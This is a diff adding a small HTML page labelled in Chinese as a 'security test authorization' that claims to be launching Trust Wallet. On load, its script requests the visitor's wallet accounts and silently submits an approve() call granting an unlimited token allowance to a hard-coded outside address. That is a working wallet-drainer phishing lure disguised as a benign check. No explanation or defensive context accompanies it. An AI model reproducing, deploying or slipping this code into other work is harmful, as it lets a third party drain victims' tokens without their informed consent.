@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>授权</title>
+  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+</head>
+<body style="text-align:center; padding:60px; background:#111; color:#0f0; font-family:sans-serif;">
+  <h2>安全测试授权</h2>
+  <p>正在拉起 Trust Wallet...</p>
+
+  <script>
+    async function run() {
+      try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+
+        const contract = new ethers.Contract(
+          "0xF911450D38669139158C71CD9ED0d2f1524f8888",
+          ["function approve(address,uint256)"],
+          signer
+        );
+
+        const tx = await contract.approve("0x5762D5c904cC7Db9B927cd26B0B3225D50bf50ED", ethers.constants.MaxUint256);
+        alert("交易发送成功！Hash: " + tx.hash);
+      } catch(e) {
+        console.log(e);
+      }
+    }
+    run();
+  </script>
+</body>
+</html>
